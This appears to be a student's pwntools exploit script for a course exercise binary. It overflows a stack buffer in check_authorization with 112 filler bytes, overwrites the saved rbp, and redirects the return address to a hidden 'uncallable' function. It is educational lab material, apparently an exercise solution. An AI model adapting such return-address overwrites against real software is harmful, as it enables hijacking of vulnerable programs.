#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise1/exercise1b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()
# Use static analysis to recover address, variables, memory allocation, etc.
# It's little endian, x86-64
# From static analysis, the address at which the method "uncallable" is stored is 0x004011b6
stack_part = 14 * b"12345678" #fill the allocated stack (allocated in check_authorization); 14 * 8 bytes = 112 bytes
main_rbp_part = b"87654321" #overwrite main's rbp value that is stored at beginning of check_authorization
ret_address = b"\xb6\x11\x40\x00" #overwrite return address (back into main) with address of "uncallable"
r.sendline(stack_part + main_rbp_part + ret_address)
print(r.recvline())

